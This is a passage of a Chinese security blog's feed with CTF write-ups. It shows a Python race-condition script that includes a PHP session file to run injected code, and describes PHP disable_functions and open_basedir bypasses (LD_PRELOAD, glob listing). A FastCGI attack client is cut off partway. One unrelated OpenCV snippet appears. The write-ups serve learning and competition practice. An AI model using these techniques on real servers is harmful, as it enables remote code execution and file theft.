即使全局匹配失败也允许搜索继续</span><br></pre></td></tr></table></figure><p>php中的另一个正则表达式ereg()进行正则匹配时存在0%00绕过问题，但是<strong>在php7+中将ereg()函数给移除了</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0-00-php中的系统变量，全局可用&quot;&gt;&lt;a href=&quot;#0-00-php中的系统变量，全局可用&quot; class=&quot;headerlink&quot; title=&quot;0%00    php中的系统变量，全局可用&quot;&gt;&lt;/a&gt;0%00    php中的系统变量，全局可用&lt;/h2
      
    
    </summary>
    
    
    
      <category term="php基础" scheme="https://knightswd.github.io/tags/php%E5%9F%BA%E7%A1%80/"/>
    
      <category term="php漏洞" scheme="https://knightswd.github.io/tags/php%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>包含session文件到rce</title>
    <link href="https://knightswd.github.io/2019/04/28/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6%E5%88%B0rce/"/>
    <id>https://knightswd.github.io/2019/04/28/%E5%8C%85%E5%90%ABsession%E6%96%87%E4%BB%B6%E5%88%B0rce/</id>
    <published>2019-04-28T12:51:23.000Z</published>
    <updated>2019-04-28T15:17:56.827Z</updated>
    
    <content type="html"><![CDATA[<p>​    这个思路来自于2019年全国大学生信息安全竞赛一个大佬writeup的web题的一个预期之外的解，出题人应该是想用一个文件包含再加上php反序列化来读取flag文件，下面这个方法没有用到php反序列化就读取到了flag文件。</p><p>下面是php7.x中session的默认配置及含义：</p><ul><li>session.upload_progress.cleanup 是否在上传结束清除上传进度信息，默认为on</li><li>session.upload_progress.enabled 是否开启记录上传进度信息，默认为on</li><li>session.upload<em>progress.prefix 存储上传进度信息的变量前缀，默认为upload_progress</em></li><li>session.upload_progress.name POST中代表进度信息的常量名称，默认为PHP_SESSION_UPLOAD_PROGRES如果</li><li>_POST[session.upload_progress.name]没有被设置, 则不会报告进度</li><li>session.serialize_handler=php session序列化存储所用的存储器（其中可能存在php反序列化漏洞）</li></ul><p>而此思路就是通过条件竞争，不断地上传恶意代码，在session还没来得及删除就将包含session文件，从而执行恶意代码。可以通过此方法向服务器发送文件。下面是代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://127.0.0.1/index.php'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">'PHPSESSID=123'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file=&#123;</span><br><span class="line">            <span class="string">"upload"</span>:(<span class="string">''</span>,<span class="string">''</span>)                                                    <span class="comment">#上传无效的空文件</span></span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">'&lt;?php readfile("./flag.php");?&gt;'</span>     <span class="comment">#恶意进度信息，readfile将直接输出文件内容</span></span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=file,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        event.wait()</span><br><span class="line">        t=r.get(<span class="string">"http://127.0.0.1/index.php?file=../tmp/tmp/sess_123"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">not</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">'[+]retry'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(t.text)</span><br><span class="line">            event.clear()</span><br><span class="line">event=threading.Event()</span><br><span class="line">event.set()</span><br><span class="line">threading.Thread(target=POST,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;​    这个思路来自于2019年全国大学生信息安全竞赛一个大佬writeup的web题的一个预期之外的解，出题人应该是想用一个文件包含再加上php反序列化来读取flag文件，下面这个方法没有用到php反序列化就读取到了flag文件。&lt;/p&gt;
&lt;p&gt;下面是php7.x中se
      
    
    </summary>
    
    
    
      <category term="php session" scheme="https://knightswd.github.io/tags/php-session/"/>
    
      <category term="文件包含" scheme="https://knightswd.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>一次数学建模的图像识别</title>
    <link href="https://knightswd.github.io/2019/04/23/%E4%B8%80%E6%AC%A1%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%9A%84%E5%9B%BE%E5%83%8F%E8%AF%86%E5%88%AB/"/>
    <id>https://knightswd.github.io/2019/04/23/%E4%B8%80%E6%AC%A1%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E7%9A%84%E5%9B%BE%E5%83%8F%E8%AF%86%E5%88%AB/</id>
    <published>2019-04-23T12:16:15.000Z</published>
    <updated>2019-04-23T12:26:19.886Z</updated>
    
    <content type="html"><![CDATA[<p>这是一次数学建模用到的图像识别代码，是关于python的opencv库的使用，在使用之前请安装opencv库。</p><p>下面是代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_picture1</span><span class="params">(filename,n)</span>:</span></span><br><span class="line">    image = cv2.imread(filename)</span><br><span class="line">    image = image[<span class="number">111</span>:<span class="number">326</span>,<span class="number">45</span>:<span class="number">314</span>]<span class="comment">#图像中你所要取的特征图像部分</span></span><br><span class="line">    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)                     <span class="comment">#将图片转化为灰度</span></span><br><span class="line">    gradX = cv2.Sobel(gray, ddepth=cv2.CV_32F,dx=<span class="number">1</span>,dy=<span class="number">0</span>,ksize=<span class="number">-1</span>)</span><br><span class="line">    gradY = cv2.Sobel(gray, ddepth=cv2.CV_32F, dx=<span class="number">0</span>, dy=<span class="number">1</span>, ksize=<span class="number">-1</span>)</span><br><span class="line">    gradient = cv2.subtract(gradX, gradY)</span><br><span class="line">    gradient = cv2.convertScaleAbs(gradient)   <span class="comment">#用sobel边缘检测算法，</span></span><br><span class="line">    blurred = cv2.blur(gradient,(<span class="number">9</span>,<span class="number">9</span>))                       <span class="comment">#这个是设置的滤波，也就是卷积核</span></span><br><span class="line">    (_, thresh) = cv2.threshold(blurred, <span class="number">80</span>, <span class="number">255</span>, cv2.THRESH_BINARY)   <span class="comment">#将图像二值化</span></span><br><span class="line">    closed = cv2.erode(thresh, <span class="literal">None</span>, iterations=<span class="number">3</span>)</span><br><span class="line">    closed = cv2.dilate(closed, <span class="literal">None</span>, iterations=<span class="number">3</span>)  <span class="comment">#形态学腐蚀膨胀去掉图像的干扰项</span></span><br><span class="line">    z = (n<span class="number">-55</span>)*<span class="number">4.25</span><span class="comment">#根据原图比例计算z轴的值</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">215</span>):<span class="comment">#输出二值化的图像中的白色部分的坐标，即具体的特征部分</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">269</span>):</span><br><span class="line">            <span class="keyword">if</span> closed[i,j]==<span class="number">255</span>:</span><br><span class="line">                f.writelines(<span class="string">'%i,%i\n'</span> % (i+<span class="number">111</span>, j+<span class="number">45</span>))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是一次数学建模用到的图像识别代码，是关于python的opencv库的使用，在使用之前请安装opencv库。&lt;/p&gt;
&lt;p&gt;下面是代码：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;
      
    
    </summary>
    
    
    
      <category term="图像识别" scheme="https://knightswd.github.io/tags/%E5%9B%BE%E5%83%8F%E8%AF%86%E5%88%AB/"/>
    
      <category term="opencv" scheme="https://knightswd.github.io/tags/opencv/"/>
    
  </entry>
  
  <entry>
    <title>0ctf的web题WallbreakerEasy</title>
    <link href="https://knightswd.github.io/2019/04/03/0ctf%E7%9A%84web%E9%A2%98WallbreakerEasy/"/>
    <id>https://knightswd.github.io/2019/04/03/0ctf%E7%9A%84web%E9%A2%98WallbreakerEasy/</id>
    <published>2019-04-03T11:40:54.000Z</published>
    <updated>2019-05-13T06:32:20.154Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0ctf-web-Wallbreaker-Easy"><a href="#0ctf-web-Wallbreaker-Easy" class="headerlink" title="0ctf web Wallbreaker Easy"></a>0ctf web Wallbreaker Easy</h1><p>题目：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Imagick is a awesome library for hackers to break &#96;disable_functions&#96;.</span><br><span class="line">So I installed php-imagick in the server, opened a &#96;backdoor&#96; for you.</span><br><span class="line">Let&#39;s try to execute &#96;&#x2F;readflag&#96; to get the flag.</span><br><span class="line">Open basedir: &#x2F;var&#x2F;www&#x2F;html:&#x2F;tmp&#x2F;027de63a1bc1d6181810b16ae83c481c</span><br><span class="line">Hint: eval($_POST[&quot;backdoor&quot;]);</span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web<br>应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><p><strong>一、LD_PRELOAD函数</strong></p><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以向别人的程序注入程序，从而达到特定的目的。</p><hr><p><strong>二、linux文件</strong></p><p> o: 编译的目标文件<br> a: 静态库，其实就是把若干o文件打了个包<br> so: 动态链接库（共享库）类似于windows的.dll文件</p><p> lo: 使用libtool编译出的目标文件，其实就是在o文件中添加了一些信息<br> la: 使用libtool编译出的库文件，其实是个文本文件，记录同名动态库和静态库的相关信息</p><hr><p>通过对phpinfo.php文件中php禁用的情况分析发现其并没有禁用putenv函数</p><p>思路是先上传<code>png.la</code>看返回的数据是否有改变，可以进一步验证是不是问题，幸运的是返回了930,然后可以进一步上传<code>png.so</code>，最后上传exploit.php（在这个文件中使用putenv函数将LD_PRELOAD函数设置为png.so），require exploit.php调用png.la和png.so就可以利用png.so的exp得到flag了。（所有上传的数据都要base64加密）</p><p>具体代码看大佬博客： <a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy" target="_blank" rel="noopener">http://momomoxiaoxi.com/2019/03/26/tctf2019/#wallbreaker-easy</a></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><hr><p>通过DirectoryIterator+glob绕过open_basedir</p><p>DirectoryIterator :是php5中增加的一个类，为用户提供一个简单的查看目录的接口</p><p>glob: 数据流包装器是从 PHP 5.3.0 起开始有效的，用来查找匹配的文件路径。</p><p>实例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///v??/run/php/*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;  </span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1234</span>;</span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///v??/run/php/.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;  </span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);  </span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法可以阅读文件目录，但是无法阅读文件内容</p><p>通过这个方法可以发现在php的目录下有<code>php7.2-fpm.sock</code>，然后考虑phpcgi漏洞</p><p>下面是fastcgi的利用脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="keyword">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">'MAX_CONNS'</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">'MAX_REQS'</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">'MPXS_CONNS'</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_sock = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_host = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_port = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_keepAlive = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host, $port = <span class="number">9000</span>)</span> // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = $host;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = $port;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (boolean)$b;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span><span 